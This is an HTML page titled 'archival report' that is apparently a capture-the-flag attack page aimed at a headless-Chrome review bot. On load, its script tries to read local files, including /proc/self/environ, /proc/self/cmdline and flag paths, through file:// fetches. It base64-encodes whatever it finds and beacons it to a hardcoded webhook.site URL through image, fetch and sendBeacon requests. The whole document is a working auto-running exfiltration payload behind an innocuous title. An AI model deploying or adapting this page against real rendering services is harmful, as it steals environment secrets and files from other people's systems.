<!doctype html>
<html>
<head><meta charset="utf-8"><title>archival report</title></head>
<body>
<h1>archival report</h1>
<pre id="log"></pre>
<script>
/*
 * coreweb LFI probe (hypothesis #2 -- low cost, NO exploit primitive).
 *
 * When the headless-Chrome review worker renders THIS page (served over https from
 * GitHub Pages), test whether it was launched with flags that let a web-origin page
 * read local files, e.g. --disable-web-security / --allow-file-access-from-files.
 *
 * If any file:// read below returns a body we win with NO renderer exploit:
 *   - a flag file        -> the flag directly
 *   - /proc/self/cmdline -> the exact chrome command line (which flags are really on)
 *   - /proc/self/environ -> env (flag is sometimes injected here)
 *
 * The challenge is blind, so every result is beaconed OUT-OF-BAND to our webhook.
 * This page only READS files inside the worker and reports them back. It contains
 * no memory-corruption / exploit code of any kind.
 */

// Served from GitHub Pages, so we cannot auto-detect the webhook from origin:
// hardcode the already-proven webhook (same UUID used in STEP 1 / 1.5).
const WEBHOOK  = "https://webhook.site/db083567-dedf-4172-bec5-a0fb04e3bd30";
const PROBE_ID = "lfi-" + Math.random().toString(36).slice(2, 8);
const MAX      = 6000; // cap exfil size per target so GET URLs stay reasonable

const logEl = document.getElementById("log");
function log(s){ try { logEl.textContent += s + "\n"; } catch (e) {} }

// binary-safe base64 (proc files contain NUL bytes; utf-8 decoding would corrupt).
function b64(bytes){
  let bin = "";
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
  return btoa(bin);
}

// beacon one result out-of-band via 3 independent channels (any one may be allowed).
function beacon(tag, status, dataB64){
  let url = WEBHOOK + "?id=" + PROBE_ID
          + "&t=" + encodeURIComponent(tag)
          + "&s=" + encodeURIComponent(status);
  if (dataB64) url += "&b64=" + encodeURIComponent(dataB64.slice(0, MAX));
  try { new Image().src = url + "&ch=img"; } catch (e) {}                 // GET via <img>
  try { fetch(url + "&ch=fetch", { mode: "no-cors" }); } catch (e) {}    // GET via fetch
  try { navigator.sendBeacon(url + "&ch=beacon", dataB64 || status); } catch (e) {} // POST
  log(tag + " -> " + status + (dataB64 ? " (" + dataB64.length + " b64)" : ""));
}

// Try to read one file:// target. Report SUCCESS+data, or the failure reason.
async function probe(path){
  const url = "file://" + path;
  try {
    const resp = await fetch(url);
    if (!resp.ok) {
      beacon(path, "HTTP " + resp.status);
      return;
    }
    const buf = await resp.arrayBuffer();
    const bytes = new Uint8Array(buf);
    const dataB64 = b64(bytes);
    beacon(path, "SUCCESS", dataB64);
  } catch (e) {
    beacon(path, "ERR: " + e.message);
  }
}

// Probe all candidate flag locations + env dumps
async function runProbes(){
  log("=== Starting LFI probes ===");
  const targets = [
    "/proc/self/cmdline",
    "/proc/self/environ",
    "/flag/flag",
    "/flag",
    "/app/flag"
  ];
  for (const path of targets) {
    await probe(path);
    // Small delay to avoid network starvation
    await new Promise(r => setTimeout(r, 100));
  }
  log("=== Probes complete ===");
}

// Auto-start when page loads
window.addEventListener("load", () => {
  runProbes().catch(e => log("Fatal: " + e.message));
});
</script>
</body>
</html>
